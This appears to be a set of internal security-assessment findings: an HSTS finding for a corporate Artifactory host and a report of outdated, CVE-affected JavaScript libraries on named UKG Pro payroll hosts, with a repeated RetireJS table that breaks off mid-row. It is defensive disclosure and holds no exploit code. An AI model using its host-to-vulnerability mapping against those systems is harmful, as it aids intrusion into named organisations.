Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

```
## Response
```bash
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.22.1
Date: Mon, 16 Sep 2024 18:51:52 GMT
Content-Type: text/html
Content-Length: 145
Location: https://artifactory.corp.adobe.com/ui/
Connection: keep-alive

<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.22.1</center>
</body>
</html>

```

# Replicate Finding:
1. Connect to the corp VPN
2. Go to the impacted URL in your browser & perform the okta login (if you have not already)
3. Using a reverse proxy like Burp, intercept or capture the requests being made
4. Fill out the form (particularly the name of the TM)
5. Inspect the reverse proxy and search for the impacted URL

# Mitigation/Remediation:
We recommend sending a `Strict-Transport-Security` HTTP header with each HTTPS response. The parameter max-age gives the time frame for requirement of HTTPS in seconds and should be chosen quite high, e.g., several months. A value below `7776000` is considered as too low. The flag `includeSubDomains` defines that the policy applies to the subdomains of the sender of the response. The syntax of the noted header will look like this:
```
Strict-Transport-Security: max-age=<seconds>[; includeSubDomains]
```

**Be advised, the above patch should be applied to all other system(s) running the impacted software that are managed by the team.**

# References:
1. [HTTP Strict Transport Security](https://developer.mozilla.org/en-US/docs/Web/Security/HTTP_strict_transport_security)
2. [sslstrip](https://github.com/moxie0/sslstrip)
3. [HSTS Preload Form](https://hstspreload.appspot.com/)
4. [CWE-523: Unprotected Transport of Credentials](https://cwe.mitre.org/data/definitions/523.html)
5. [CAPEC-94: Man in the Middle Attack](https://capec.mitre.org/data/definitions/94.html)
6. [CAPEC-157: Sniffing Attacks](https://capec.mitre.org/data/definitions/157.html)


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Submitted/Template - SECVULN - CR.md
---

# Risk: High (7.5)
**CVSS Vector (CVSS:3.1):** /AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

# Description:
While adding my banking information in the UKG Pro app during onboarding, we observed the noted web application used outdated 3P software with known vulnerabilities. 
# Impact:
Using outdated vulnerable software poses significant risks, including security vulnerabilities, malware attacks, data loss, compliance issues, and reduced productivity. Outdated software is often no longer supported by its developers, which means that any security vulnerabilities that are discovered are unlikely to be patched. This makes it easier for hackers to exploit these vulnerabilities and gain access to your system or steal your data.

# Affected Assets:
## Affected Software:
1. jquery-migrate@1.2.1
2. jquery-migrate@1.2.1.min
3. jquery-ui@1.12.1
4. jquery@1.12.4
5. knockout@3.3.0
6. moment.js@2.10.2
## Affected Host(s):
1. https://n24.ultipro.com/default.aspx
2. https://adobe.ultipro.com/
3. https://n24.ultipro.com/lib/knockout/knockout.min.js?v=21.0.0.6754&ts=1704789197
4. https://n24.ultipro.com/scripts/release/ukgpro-en.js?v=21.0.0.6754&ts=1704789197
5. https://n24.ultipro.com/scripts/release/ultipro-en.js?v=21.0.0.6754&ts=1704789197
6. https://n24c.ultipro.com/lib/jquery/jquery.min.js?v=21.0.0.6754&ts=1704787577
7. https://n24c.ultipro.com/lib/jquery/plugins/jquery-migrate-1.2.1.min.js?v=21.0.0.6754&ts=1704787577
8. https://n24c.ultipro.com/lib/jquery/ui/jquery-ui.min.js?v=21.0.0.6754&ts=1704787577

# Evidence:

## Screenshot:
![[Pasted image 20240111171310.png]]
## RetireJS Report:
|   |   |   |
|---|---|---|
|jquery-migrate|1.2.1.min|Found in https://n24c.ultipro.com/lib/jquery/plugins/jquery-migrate-1.2.1.min.js?v=21.0.0.6754&ts=1704787577 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|11290 Selector interpreted as HTML\|[1](http://bugs.jquery.com/ticket/11290 "http://bugs.jquery.com/ticket/11290")[2](http://research.insecurelabs.org/jquery/test/ "http://research.insecurelabs.org/jquery/test/")\||
|jquery-migrate|1.2.1.min|Found in https://n24c.ultipro.com/lib/jquery/plugins/jquery-migrate-1.2.1.min.js?v=21.0.0.6754&ts=1704787577 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|11290 Selector interpreted as HTML\|[1](http://bugs.jquery.com/ticket/11290 "http://bugs.jquery.com/ticket/11290")[2](http://research.insecurelabs.org/jquery/test/ "http://research.insecurelabs.org/jquery/test/")\||
|jquery-migrate|1.2.1|Found in https://n24.ultipro.com/scripts/release/ultipro-en.js?v=21.0.0.6754&ts=1704789197 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|11290 Selector interpreted as HTML\|[1](http://bugs.jquery.com/ticket/11290 "http://bugs.jquery.com/ticket/11290")[2](http://research.insecurelabs.org/jquery/test/ "http://research.insecurelabs.org/jquery/test/")\||
|jquery-migrate|1.2.1|Found in https://n24.ultipro.com/scripts/release/ultipro-en.js?v=21.0.0.6754&ts=1704789197 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|11290 Selector interpreted as HTML\|[1](http://bugs.jquery.com/ticket/11290 "http://bugs.jquery.com/ticket/11290")[2](http://research.insecurelabs.org/jquery/test/ "http://research.insecurelabs.org/jquery/test/")\||
|jquery-ui|1.12.1|Found in https://n24.ultipro.com/scripts/release/ukgpro-en.js?v=21.0.0.6754&ts=1704789197 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|XSS when refreshing checkboxes if usercontrolled data in labels 2101 CVE-2022-31160 GHSA-h6gj-6jjq-h8g9\|[1](https://github.com/jquery/jquery-ui/issues/2101 "https://github.com/jquery/jquery-ui/issues/2101")[2](https://github.com/jquery/jquery-ui/commit/8cc5bae1caa1fcf96bf5862c5646c787020ba3f9 "https://github.com/jquery/jquery-ui/commit/8cc5bae1caa1fcf96bf5862c5646c787020ba3f9")[3](https://github.com/advisories/GHSA-h6gj-6jjq-h8g9 "https://github.com/advisories/GHSA-h6gj-6jjq-h8g9")[4](https://nvd.nist.gov/vuln/detail/CVE-2022-31160 "https://nvd.nist.gov/vuln/detail/CVE-2022-31160")\|<br>\|medium\|CVE-2021-41184 XSS in the `of` option of the `.position()` util GHSA-gpqq-952q-5327\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-gpqq-952q-5327 "https://github.com/jquery/jquery-ui/security/advisories/GHSA-gpqq-952q-5327")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41184 "https://nvd.nist.gov/vuln/detail/CVE-2021-41184")\|<br>\|medium\|CVE-2021-41183 15284 XSS Vulnerability on text options of jQuery UI datepicker GHSA-j7qv-pgf6-hvh4\|[1](https://bugs.jqueryui.com/ticket/15284 "https://bugs.jqueryui.com/ticket/15284")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41183 "https://nvd.nist.gov/vuln/detail/CVE-2021-41183")\|<br>\|medium\|CVE-2021-41182 XSS in the `altField` option of the Datepicker widget GHSA-9gj3-hwp5-pmwc\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc "https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41182 "https://nvd.nist.gov/vuln/detail/CVE-2021-41182")\|<br>\|medium\|CVE-2022-31160 XSS when refreshing a checkboxradio with an HTML-like initial text label GHSA-h6gj-6jjq-h8g9\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-h6gj-6jjq-h8g9 "https://github.com/jquery/jquery-ui/security/advisories/GHSA-h6gj-6jjq-h8g9")[2](https://nvd.nist.gov/vuln/detail/CVE-2022-31160 "https://nvd.nist.gov/vuln/detail/CVE-2022-31160")\||
|jquery-ui|1.12.1|Found in https://n24.ultipro.com/scripts/release/ukgpro-en.js?v=21.0.0.6754&ts=1704789197 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|XSS when refreshing checkboxes if usercontrolled data in labels 2101 CVE-2022-31160 GHSA-h6gj-6jjq-h8g9\|[1](https://github.com/jquery/jquery-ui/issues/2101 "https://github.com/jquery/jquery-ui/issues/2101")[2](https://github.com/jquery/jquery-ui/commit/8cc5bae1caa1fcf96bf5862c5646c787020ba3f9 "https://github.com/jquery/jquery-ui/commit/8cc5bae1caa1fcf96bf5862c5646c787020ba3f9")[3](https://github.com/advisories/GHSA-h6gj-6jjq-h8g9 "https://github.com/advisories/GHSA-h6gj-6jjq-h8g9")[4](https://nvd.nist.gov/vuln/detail/CVE-2022-31160 "https://nvd.nist.gov/vuln/detail/CVE-2022-31160")\|<br>\|medium\|CVE-2021-41184 XSS in the `of` option of the `.position()` util GHSA-gpqq-952q-5327\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-gpqq-952q-5327 "https://github.com/jquery/jquery-ui/security/advisories/GHSA-gpqq-952q-5327")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41184 "https://nvd.nist.gov/vuln/detail/CVE-2021-41184")\|<br>\|medium\|CVE-2021-41183 15284 XSS Vulnerability on text options of jQuery UI datepicker GHSA-j7qv-pgf6-hvh4\|[1](https://bugs.jqueryui.com/ticket/15284 "https://bugs.jqueryui.com/ticket/15284")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41183 "https://nvd.nist.gov/vuln/detail/CVE-2021-41183")\|<br>\|medium\|CVE-2021-41182 XSS in the `altField` option of the Datepicker widget GHSA-9gj3-hwp5-pmwc\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc "https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41182 "https://nvd.nist.gov/vuln/detail/CVE-2021-41182")\|<br>\|medium\|CVE-2022-31160 XSS when refreshing a checkboxradio with an HTML-like initial text label GHSA-h6gj-6jjq-h8g9\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-h6gj-6jjq-h8g9 "https://github.com/jquery/jquery-ui/security/advisories/GHSA-h6gj-6jjq-h8g9")[2](https://nvd.nist.gov/vuln/detail/CVE-2022-31160 "https://nvd.nist.gov/vuln/detail/CVE-2022-31160")\||
|jquery-ui|1.12.1|Found in https://n24.ultipro.com/scripts/release/ultipro-en.js?v=21.0.0.6754&ts=1704789197 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|XSS when refreshing checkboxes if usercontrolled data in labels 2101 CVE-2022-31160 GHSA-h6gj-6jjq-h8g9\|[1](https://github.com/jquery/jquery-ui/issues/2101 "https://github.com/jquery/jquery-ui/issues/2101")[2](https://github.com/jquery/jquery-ui/commit/8cc5bae1caa1fcf96bf5862c5646c787020ba3f9 "https://github.com/jquery/jquery-ui/commit/8cc5bae1caa1fcf96bf5862c5646c787020ba3f9")[3](https://github.com/advisories/GHSA-h6gj-6jjq-h8g9 "https://github.com/advisories/GHSA-h6gj-6jjq-h8g9")[4](https://nvd.nist.gov/vuln/detail/CVE-2022-31160 "https://nvd.nist.gov/vuln/detail/CVE-2022-31160")\|<br>\|medium\|CVE-2021-41184 XSS in the `of` option of the `.position()` util GHSA-gpqq-952q-5327\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-gpqq-952q-5327 "https://github.com/jquery/jquery-ui/security/advisories/GHSA-gpqq-952q-5327")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41184 "https://nvd.nist.gov/vuln/detail/CVE-2021-41184")\|<br>\|medium\|CVE-2021-41183 15284 XSS Vulnerability on text options of jQuery UI datepicker GHSA-j7qv-pgf6-hvh4\|[1](https://bugs.jqueryui.com/ticket/15284 "https://bugs.jqueryui.com/ticket/15284")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41183 "https://nvd.nist.gov/vuln/detail/CVE-2021-41183")\|<br>\|medium\|CVE-2021-41182 XSS in the `altField` option of the Datepicker widget GHSA-9gj3-hwp5-pmwc\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc "https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41182 "https://nvd.nist.gov/vuln/detail/CVE-2021-41182")\|<br>\|medium\|CVE-2022-31160 XSS when refreshing a checkboxradio with an HTML-like initial text label GHSA-h6gj-6jjq-h8g9\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-h6gj-6jjq-h8g9 "https://github.com/jquery/jquery-ui/security/advisories/GHSA-h6gj-6jjq-h8g9")[2](https://nvd.nist.gov/vuln/detail/CVE-2022-31160 "https://nvd.nist.gov/vuln/detail/CVE-2022-31160")\||
|jquery-ui|1.12.1|Found in https://n24.ultipro.com/scripts/release/ultipro-en.js?v=21.0.0.6754&ts=1704789197 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|XSS when refreshing checkboxes if usercontrolled data in labels 2101 CVE-2022-31160 GHSA-h6gj-6jjq-h8g9\|[1](https://github.com/jquery/jquery-ui/issues/2101 "https://github.com/jquery/jquery-ui/issues/2101")[2](https://github.com/jquery/jquery-ui/commit/8cc5bae1caa1fcf96bf5862c5646c787020ba3f9 "https://github.com/jquery/jquery-ui/commit/8cc5bae1caa1fcf96bf5862c5646c787020ba3f9")[3](https://github.com/advisories/GHSA-h6gj-6jjq-h8g9 "https://github.com/advisories/GHSA-h6gj-6jjq-h8g9")[4](https://nvd.nist.gov/vuln/detail/CVE-2022-31160 "https://nvd.nist.gov/vuln/detail/CVE-2022-31160")\|<br>\|medium\|CVE-2021-41184 XSS in the `of` option of the `.position()` util GHSA-gpqq-952q-5327\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-gpqq-952q-5327 "https://github.com/jquery/jquery-ui/security/advisories/GHSA-gpqq-952q-5327")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41184 "https://nvd.nist.gov/vuln/detail/CVE-2021-41184")\|<br>\|medium\|CVE-2021-41183 15284 XSS Vulnerability on text options of jQuery UI datepicker GHSA-j7qv-pgf6-hvh4\|[1](https://bugs.jqueryui.com/ticket/15284 "https://bugs.jqueryui.com/ticket/15284")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41183 "https://nvd.nist.gov/vuln/detail/CVE-2021-41183")\|<br>\|medium\|CVE-2021-41182 XSS in the `altField` option of the Datepicker widget GHSA-9gj3-hwp5-pmwc\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc "https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41182 "https://nvd.nist.gov/vuln/detail/CVE-2021-41182")\|<br>\|medium\|CVE-2022-31160 XSS when refreshing a checkboxradio with an HTML-like initial text label GHSA-h6gj-6jjq-h8g9\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-h6gj-6jjq-h8g9 "https://github.com/jquery/jquery-ui/security/advisories/GHSA-h6gj-6jjq-h8g9")[2](https://nvd.nist.gov/vuln/detail/CVE-2022-31160 "https://nvd.nist.gov/vuln/detail/CVE-2022-31160")\||
|jquery-ui|1.12.1|Found in https://n24c.ultipro.com/lib/jquery/ui/jquery-ui.min.js?v=21.0.0.6754&ts=1704787577 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|XSS when refreshing checkboxes if usercontrolled data in labels 2101 CVE-2022-31160 GHSA-h6gj-6jjq-h8g9\|[1](https://github.com/jquery/jquery-ui/issues/2101 "https://github.com/jquery/jquery-ui/issues/2101")[2](https://github.com/jquery/jquery-ui/commit/8cc5bae1caa1fcf96bf5862c5646c787020ba3f9 "https://github.com/jquery/jquery-ui/commit/8cc5bae1caa1fcf96bf5862c5646c787020ba3f9")[3](https://github.com/advisories/GHSA-h6gj-6jjq-h8g9 "https://github.com/advisories/GHSA-h6gj-6jjq-h8g9")[4](https://nvd.nist.gov/vuln/detail/CVE-2022-31160 "https://nvd.nist.gov/vuln/detail/CVE-2022-31160")\|<br>\|medium\|CVE-2021-41184 XSS in the `of` option of the `.position()` util GHSA-gpqq-952q-5327\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-gpqq-952q-5327 "https://github.com/jquery/jquery-ui/security/advisories/GHSA-gpqq-952q-5327")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41184 "https://nvd.nist.gov/vuln/detail/CVE-2021-41184")\|<br>\|medium\|CVE-2021-41183 15284 XSS Vulnerability on text options of jQuery UI datepicker GHSA-j7qv-pgf6-hvh4\|[1](https://bugs.jqueryui.com/ticket/15284 "https://bugs.jqueryui.com/ticket/15284")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41183 "https://nvd.nist.gov/vuln/detail/CVE-2021-41183")\|<br>\|medium\|CVE-2021-41182 XSS in the `altField` option of the Datepicker widget GHSA-9gj3-hwp5-pmwc\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc "https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41182 "https://nvd.nist.gov/vuln/detail/CVE-2021-41182")\|<br>\|medium\|CVE-2022-31160 XSS when refreshing a checkboxradio with an HTML-like initial text label GHSA-h6gj-6jjq-h8g9\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-h6gj-6jjq-h8g9 "https://github.com/jquery/jquery-ui/security/advisories/GHSA-h6gj-6jjq-h8g9")[2](https://nvd.nist.gov/vuln/detail/CVE-2022-31160 "https://nvd.nist.gov/vuln/detail/CVE-2022-31160")\||
|jquery-ui|1.12.1|Found in https://n24c.ultipro.com/lib/jquery/ui/jquery-ui.min.js?v=21.0.0.6754&ts=1704787577 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|XSS when refreshing checkboxes if usercontrolled data in labels 2101 CVE-2022-31160 GHSA-h6gj-6jjq-h8g9\|[1](https://github.com/jquery/jquery-ui/issues/2101 "https://github.com/jquery/jquery-ui/issues/2101")[2](https://github.com/jquery/jquery-ui/commit/8cc5bae1caa1fcf96bf5862c5646c787020ba3f9 "https://github.com/jquery/jquery-ui/commit/8cc5bae1caa1fcf96bf5862c5646c787020ba3f9")[3](https://github.com/advisories/GHSA-h6gj-6jjq-h8g9 "https://github.com/advisories/GHSA-h6gj-6jjq-h8g9")[4](https://nvd.nist.gov/vuln/detail/CVE-2022-31160 "https://nvd.nist.gov/vuln/detail/CVE-2022-31160")\|<br>\|medium\|CVE-2021-41184 XSS in the `of` option of the `.position()` util GHSA-gpqq-952q-5327\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-gpqq-952q-5327 "https://github.com/jquery/jquery-ui/security/advisories/GHSA-gpqq-952q-5327")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41184 "https://nvd.nist.gov/vuln/detail/CVE-2021-41184")\|<br>\|medium\|CVE-2021-41183 15284 XSS Vulnerability on text options of jQuery UI datepicker GHSA-j7qv-pgf6-hvh4\|[1](https://bugs.jqueryui.com/ticket/15284 "https://bugs.jqueryui.com/ticket/15284")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41183 "https://nvd.nist.gov/vuln/detail/CVE-2021-41183")\|<br>\|medium\|CVE-2021-41182 XSS in the `altField` option of the Datepicker widget GHSA-9gj3-hwp5-pmwc\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc "https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc")[2](https://nvd.nist.gov/vuln/detail/CVE-2021-41182 "https://nvd.nist.gov/vuln/detail/CVE-2021-41182")\|<br>\|medium\|CVE-2022-31160 XSS when refreshing a checkboxradio with an HTML-like initial text label GHSA-h6gj-6jjq-h8g9\|[1](https://github.com/jquery/jquery-ui/security/advisories/GHSA-h6gj-6jjq-h8g9 "https://github.com/jquery/jquery-ui/security/advisories/GHSA-h6gj-6jjq-h8g9")[2](https://nvd.nist.gov/vuln/detail/CVE-2022-31160 "https://nvd.nist.gov/vuln/detail/CVE-2022-31160")\||
|jquery|1.12.4|Found in https://n24.ultipro.com/scripts/release/ultipro-en.js?v=21.0.0.6754&ts=1704789197 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|2432 3rd party CORS request may execute CVE-2015-9251 GHSA-rmxg-73gg-4p98\|[1](https://github.com/jquery/jquery/issues/2432 "https://github.com/jquery/jquery/issues/2432")[2](http://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/ "http://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/")[3](https://nvd.nist.gov/vuln/detail/CVE-2015-9251 "https://nvd.nist.gov/vuln/detail/CVE-2015-9251")[4](http://research.insecurelabs.org/jquery/test/ "http://research.insecurelabs.org/jquery/test/")\|<br>\|medium\|CVE-2015-9251 11974 parseHTML() executes scripts in event handlers GHSA-rmxg-73gg-4p98\|[1](https://bugs.jquery.com/ticket/11974 "https://bugs.jquery.com/ticket/11974")[2](https://nvd.nist.gov/vuln/detail/CVE-2015-9251 "https://nvd.nist.gov/vuln/detail/CVE-2015-9251")[3](http://research.insecurelabs.org/jquery/test/ "http://research.insecurelabs.org/jquery/test/")\|<br>\|medium\|CVE-2019-11358 4333 jQuery before 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles jQuery.extend(true, {}, ...) because of Object.prototype pollution GHSA-6c3j-c64m-qhgq\|[1](https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/ "https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/")[2](https://nvd.nist.gov/vuln/detail/CVE-2019-11358 "https://nvd.nist.gov/vuln/detail/CVE-2019-11358")[3](https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b "https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b")\|<br>\|medium\|CVE-2020-11022 4642 Regex in its jQuery.htmlPrefilter sometimes may introduce XSS GHSA-gxr4-xjj5-5px2\|[1](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/ "https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/")\|<br>\|medium\|CVE-2020-11023 CVE-2020-23064 4647 passing HTML containing <option> elements from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. .html(), .append(), and others) may execute untrusted code. GHSA-jpcq-cgw6-v4j6\|[1](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/ "https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/")\|<br>\|low\|73 jQuery 1.x and 2.x are End-of-Life and no longer receiving security updates\|[1](https://github.com/jquery/jquery.com/issues/162 "https://github.com/jquery/jquery.com/issues/162")\||
|jquery|1.12.4|Found in https://n24.ultipro.com/scripts/release/ultipro-en.js?v=21.0.0.6754&ts=1704789197 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|2432 3rd party CORS request may execute CVE-2015-9251 GHSA-rmxg-73gg-4p98\|[1](https://github.com/jquery/jquery/issues/2432 "https://github.com/jquery/jquery/issues/2432")[2](http://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/ "http://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/")[3](https://nvd.nist.gov/vuln/detail/CVE-2015-9251 "https://nvd.nist.gov/vuln/detail/CVE-2015-9251")[4](http://research.insecurelabs.org/jquery/test/ "http://research.insecurelabs.org/jquery/test/")\|<br>\|medium\|CVE-2015-9251 11974 parseHTML() executes scripts in event handlers GHSA-rmxg-73gg-4p98\|[1](https://bugs.jquery.com/ticket/11974 "https://bugs.jquery.com/ticket/11974")[2](https://nvd.nist.gov/vuln/detail/CVE-2015-9251 "https://nvd.nist.gov/vuln/detail/CVE-2015-9251")[3](http://research.insecurelabs.org/jquery/test/ "http://research.insecurelabs.org/jquery/test/")\|<br>\|medium\|CVE-2019-11358 4333 jQuery before 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles jQuery.extend(true, {}, ...) because of Object.prototype pollution GHSA-6c3j-c64m-qhgq\|[1](https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/ "https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/")[2](https://nvd.nist.gov/vuln/detail/CVE-2019-11358 "https://nvd.nist.gov/vuln/detail/CVE-2019-11358")[3](https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b "https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b")\|<br>\|medium\|CVE-2020-11022 4642 Regex in its jQuery.htmlPrefilter sometimes may introduce XSS GHSA-gxr4-xjj5-5px2\|[1](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/ "https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/")\|<br>\|medium\|CVE-2020-11023 CVE-2020-23064 4647 passing HTML containing <option> elements from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. .html(), .append(), and others) may execute untrusted code. GHSA-jpcq-cgw6-v4j6\|[1](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/ "https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/")\|<br>\|low\|73 jQuery 1.x and 2.x are End-of-Life and no longer receiving security updates\|[1](https://github.com/jquery/jquery.com/issues/162 "https://github.com/jquery/jquery.com/issues/162")\||
|jquery|1.12.4|Found in https://n24c.ultipro.com/lib/jquery/jquery.min.js?v=21.0.0.6754&ts=1704787577 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|2432 3rd party CORS request may execute CVE-2015-9251 GHSA-rmxg-73gg-4p98\|[1](https://github.com/jquery/jquery/issues/2432 "https://github.com/jquery/jquery/issues/2432")[2](http://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/ "http://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/")[3](https://nvd.nist.gov/vuln/detail/CVE-2015-9251 "https://nvd.nist.gov/vuln/detail/CVE-2015-9251")[4](http://research.insecurelabs.org/jquery/test/ "http://research.insecurelabs.org/jquery/test/")\|<br>\|medium\|CVE-2015-9251 11974 parseHTML() executes scripts in event handlers GHSA-rmxg-73gg-4p98\|[1](https://bugs.jquery.com/ticket/11974 "https://bugs.jquery.com/ticket/11974")[2](https://nvd.nist.gov/vuln/detail/CVE-2015-9251 "https://nvd.nist.gov/vuln/detail/CVE-2015-9251")[3](http://research.insecurelabs.org/jquery/test/ "http://research.insecurelabs.org/jquery/test/")\|<br>\|medium\|CVE-2019-11358 4333 jQuery before 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles jQuery.extend(true, {}, ...) because of Object.prototype pollution GHSA-6c3j-c64m-qhgq\|[1](https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/ "https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/")[2](https://nvd.nist.gov/vuln/detail/CVE-2019-11358 "https://nvd.nist.gov/vuln/detail/CVE-2019-11358")[3](https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b "https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b")\|<br>\|medium\|CVE-2020-11022 4642 Regex in its jQuery.htmlPrefilter sometimes may introduce XSS GHSA-gxr4-xjj5-5px2\|[1](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/ "https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/")\|<br>\|medium\|CVE-2020-11023 CVE-2020-23064 4647 passing HTML containing <option> elements from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. .html(), .append(), and others) may execute untrusted code. GHSA-jpcq-cgw6-v4j6\|[1](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/ "https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/")\|<br>\|low\|73 jQuery 1.x and 2.x are End-of-Life and no longer receiving security updates\|[1](https://github.com/jquery/jquery.com/issues/162 "https://github.com/jquery/jquery.com/issues/162")\||
|jquery|1.12.4|Found in https://n24c.ultipro.com/lib/jquery/jquery.min.js?v=21.0.0.6754&ts=1704787577 _____Vulnerability info:<br><br>\|   \|   \|   \|<br>\|---\|---\|---\|<br>\|medium\|2432 3rd party CORS request may execute CVE-2015-9251 GHSA-rmxg-73gg-4p98\|[1](https://github.com/jquery/jquery/issues/2432 "https://github.com/jquery/jquery/issues/2432")[2](http://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/ "http://blog.jquery.com/2016/01/08/jquery-2-2-and-1-12-released/")[3](https://nvd.nist.gov/vuln/detail/CVE-2015-9251 "https://nvd.nist.gov/vuln/detail/CVE-2015-9251")[4](http://research.insecurelabs.org/jquery/test/ "http://research.insecurelabs.org/jquery/test/")\|<br>\|medium\|CVE-2015-9251 11974 parseHTML() executes scripts in event handlers GHSA-rmxg-73gg-4p98\|[1](https://bugs.jquery.com/ticket/11974 "https://bugs.jquery.com/ticket/11974")[2](https://nvd.nist.gov/vuln/detail/CVE-2015-9251 "https://nvd.nist.gov/vuln/detail/CVE-2015-9251")[3](http://research.insecurelabs.org/jquery/test/ "http://research.insecurelabs.org/jquery/test/")\|<br>\|medium\|CVE-2019-11358 4333 jQuery before 3.4.0, as used in Drupal, Backdrop CMS, and other products, mishandles jQuery.extend(true, {}, ...) because of Object.prototype pollution 